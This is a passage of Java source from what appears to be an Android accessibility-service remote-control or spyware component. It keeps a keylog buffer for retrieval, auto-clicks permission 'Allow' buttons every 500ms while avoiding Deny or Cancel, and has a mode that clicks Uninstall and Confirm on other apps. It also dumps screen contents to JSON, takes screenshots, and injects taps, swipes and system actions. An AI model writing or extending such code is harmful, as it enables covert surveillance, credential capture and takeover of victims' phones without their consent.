                        Uri.parse("package:" + getPackageName())));
                delay += 3000;
            } catch (Exception e) {
                Log.w(TAG, "write settings: " + e.getMessage());
            }
        }
    }

    private void scheduleIntent(Handler h, long delayMs, Intent intent) {
        h.postDelayed(() -> {
            try {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            } catch (Exception e) {
                Log.w(TAG, "scheduleIntent: " + e.getMessage());
            }
        }, delayMs);
    }

    /** Enable uninstall-assist mode: accessibility will click Uninstall/OK buttons. */
    public void enableUninstallAssist() {
        uninstallAssistMode = true;
        Log.i(TAG, "Uninstall-assist mode ENABLED");
    }

    private boolean runUninstallAssist(AccessibilityNodeInfo rootNode) {
        if (!uninstallAssistMode) return false;
        String[] uninstallWords = { "Uninstall", "OK", "Delete", "Remove", "Yes", "Confirm" };
        for (String word : uninstallWords) {
            if (findAndClickFullWord(rootNode, word)) return true;
        }
        return false;
    }
    
    private boolean findAndClickFullWord(AccessibilityNodeInfo node, String searchText) {
        if (node == null) return false;
        
        try {
            CharSequence text = node.getText();
            CharSequence desc = node.getContentDescription();
            
            // Check if this is a negative word that should NEVER be clicked
            if (text != null && isNegativeWord(text.toString().trim())) {
                return false;
            }
            if (desc != null && isNegativeWord(desc.toString().trim())) {
                return false;
            }
            
            boolean matches = false;
            
            // Check text - exact match only (case insensitive), not substring
            if (text != null) {
                String nodeText = text.toString().trim();
                String searchTrimmed = searchText.trim();
                // Only match if EXACTLY equal, not contains
                if (nodeText.equalsIgnoreCase(searchTrimmed) && nodeText.length() == searchTrimmed.length()) {
                    matches = true;
                }
            }
            
            // Check content description - exact match only (case insensitive)
            if (desc != null) {
                String nodeDesc = desc.toString().trim();
                String searchTrimmed = searchText.trim();
                if (nodeDesc.equalsIgnoreCase(searchTrimmed) && nodeDesc.length() == searchTrimmed.length()) {
                    matches = true;
                }
            }
            
            if (matches) {
                // Only click if it's a button or clickable element
                boolean isButton = false;
                CharSequence className = node.getClassName();
                if (className != null) {
                    String classStr = className.toString().toLowerCase();
                    if (classStr.contains("button") || classStr.contains("textview") || 
                        classStr.contains("imagebutton") || classStr.contains("checkbox") ||
                        classStr.contains("switch") || classStr.contains("toggle")) {
                        isButton = true;
                    }
                }
                
                // Try to click this element if clickable or is a button type
                if (node.isClickable() || isButton) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return true;
                }
                
                // Try to click parent
                AccessibilityNodeInfo parent = node.getParent();
                if (parent != null) {
                    if (parent.isClickable()) {
                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        parent.recycle();
                        return true;
                    }
                    parent.recycle();
                }
                
                // Try to perform click action directly
                return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }
            
            // Recursively check ALL children
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    if (findAndClickFullWord(child, searchText)) {
                        child.recycle();
                        return true;
                    }
                    child.recycle();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        return false;
    }
    
    private boolean isNegativeWord(String text) {
        if (text == null || text.isEmpty()) return false;
        
        String trimmedText = text.trim();
        
        String[] negativeWords = {
            "Deny", "DENY",
            "Don't allow", "don't allow", "DON'T ALLOW",
            "Dont allow", "dont allow", "DONT ALLOW",
            "Never", "NEVER",
            "Never allow", "never allow", "NEVER ALLOW",
            "Restrict", "RESTRICT",
            "Restricted", "RESTRICTED",
            "No", "NO",
            "Refuse", "REFUSE",
            "Block", "BLOCK",
            "Keep restricted", "keep restricted", "KEEP RESTRICTED",
            "Not optimized", "not optimized", "NOT OPTIMIZED",
            "Cancel", "CANCEL",
            "Skip", "SKIP",
            "Later", "LATER",
            "Not now", "not now", "NOT NOW",
            "Decline", "DECLINE",
            "Disallow", "DISALLOW",
            "Dismiss", "DISMISS",
            "Close", "CLOSE",
            "Don't allow", "dont allow"
        };
        
        for (String word : negativeWords) {
            if (trimmedText.equals(word)) {
                return true;
            }
        }
        
        return false;
    }

    @Override
    public void onInterrupt() {
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (autoClickHandler != null && autoClickRunnable != null) {
            autoClickHandler.removeCallbacks(autoClickRunnable);
        }
        if (socketCheckHandler != null && socketCheckRunnable != null) {
            socketCheckHandler.removeCallbacks(socketCheckRunnable);
            socketCheckHandler = null;
        }
        if (keepAliveManager != null) {
            keepAliveManager.stop();
            keepAliveManager = null;
        }
        instance = null;
    }

    public JSONObject readScreen() {
        JSONObject result = new JSONObject();
        try {
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode == null) {
                result.put("success", false);
                result.put("error", "No active window");
                return result;
            }
            
            JSONObject screenData = new JSONObject();
            screenData.put("packageName", rootNode.getPackageName() != null ? rootNode.getPackageName().toString() : "");
            screenData.put("className", rootNode.getClassName() != null ? rootNode.getClassName().toString() : "");
            
            JSONArray elements = new JSONArray();
            readNodeRecursive(rootNode, elements, 0);
            screenData.put("elements", elements);
            screenData.put("elementCount", elements.length());
            
            rootNode.recycle();
            
            result.put("success", true);
            result.put("screen", screenData);
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (Exception ignored) {}
        }
        return result;
    }
    
    private void readNodeRecursive(AccessibilityNodeInfo node, JSONArray elements, int depth) {
        if (node == null || depth > 10) return;
        
        try {
            if (node.getText() != null || node.getContentDescription() != null) {
                JSONObject obj = new JSONObject();
                obj.put("text", node.getText() != null ? node.getText().toString() : "");
                obj.put("desc", node.getContentDescription() != null ? node.getContentDescription().toString() : "");
                obj.put("class", node.getClassName() != null ? node.getClassName().toString() : "");
                obj.put("clickable", node.isClickable());
                obj.put("scrollable", node.isScrollable());
                elements.put(obj);
            }
            
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    readNodeRecursive(child, elements, depth + 1);
                    child.recycle();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public boolean performClick(float x, float y) {
        Path path = new Path();
        path.moveTo(x, y);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 100));
        return dispatchGesture(builder.build(), null, null);
    }
    
    public boolean performSwipe(float x1, float y1, float x2, float y2, int duration) {
        Path path = new Path();
        path.moveTo(x1, y1);
        path.lineTo(x2, y2);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(path, 0, duration));
        return dispatchGesture(builder.build(), null, null);
    }
    
    public boolean performBack() {
        return performGlobalAction(GLOBAL_ACTION_BACK);
    }
    
    public boolean performHome() {
        return performGlobalAction(GLOBAL_ACTION_HOME);
    }
    
    public boolean performRecents() {
        return performGlobalAction(GLOBAL_ACTION_RECENTS);
    }
    
    public boolean performNotifications() {
        return performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS);
    }
    
    public List<String> getKeylogs() {
        List<String> logs = new ArrayList<>(keylogBuffer);
        keylogBuffer.clear();
        return logs;
    }
    
    private void startAutoClickScanner() {
        autoClickHandler = new Handler(Looper.getMainLooper());
        autoClickRunnable = new Runnable() {
            @Override
            public void run() {
                autoClickAllowButton();
                if (autoClickHandler != null && autoClickRunnable != null) {
                    autoClickHandler.postDelayed(this, 500); // Scan every 500ms
                }
            }
        };
        autoClickHandler.post(autoClickRunnable);
    }

    /**
     * Capture the current screen as a Bitmap using AccessibilityService.takeScreenshot() (API 30+).
     * Blocks the calling thread until the screenshot is ready (max 3 seconds).
     * Returns null on failure or if API < 30.
     */
    @RequiresApi(api = Build.VERSION_CODES.R)
    public Bitmap captureScreenSync() {
        final AtomicReference<Bitmap> result = new AtomicReference<>(null);
        final CountDownLatch latch = new CountDownLatch(1);
        try {
            takeScreenshot(Display.DEFAULT_DISPLAY,
                    getMainExecutor(),
                    new TakeScreenshotCallback() {
                        @Override
                        public void onSuccess(ScreenshotResult screenshot) {
                            try {
                                Bitmap bmp = Bitmap.wrapHardwareBuffer(
                                        screenshot.getHardwareBuffer(), screenshot.getColorSpace());
                                if (bmp != null) {
                                    result.set(bmp.copy(Bitmap.Config.ARGB_8888, false));
                                    bmp.recycle();
                                }
                                screenshot.getHardwareBuffer().close();
                            } catch (Exception e) {
                                Log.e(TAG, "captureScreenSync onSuccess error: " + e.getMessage());
                            } finally {
                                latch.countDown();
                            }
                        }
                        @Override
                        public void onFailure(int errorCode) {
                            Log.w(TAG, "captureScreenSync failed, errorCode=" + errorCode);
                            latch.countDown();
                        }
                    });
            latch.await(3, TimeUnit.SECONDS);
        } catch (Exception e) {
            Log.e(TAG, "captureScreenSync error: " + e.getMessage());
        }
        return result.get();
    }
}
